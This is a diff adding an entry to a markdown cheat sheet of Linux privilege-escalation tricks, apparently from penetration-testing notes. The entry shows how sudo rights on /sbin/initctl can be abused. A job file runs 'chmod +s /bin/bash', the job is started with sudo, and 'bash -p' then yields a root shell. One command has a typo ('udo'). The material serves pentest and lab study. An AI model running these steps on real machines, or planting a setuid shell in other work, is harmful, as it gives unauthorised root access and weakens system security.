@@ -110,6 +110,23 @@ https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/m
 
 ## Privilege Escalation:
 
++ <b>/sbin/initctl</b>
+```
+Check current status of services
+udo -u root /sbin/initctl list
+```
+```
+Add this to test.conf
+script
+    chmod +s /bin/bash
+end script
+```
+```
+sudo /sbin/initctl start test.conf
+$/bin/bash -p
+#whoami
+```
+
 + <b>less</b>
 ```
 less [file in path user is allowed to execute less as root with]
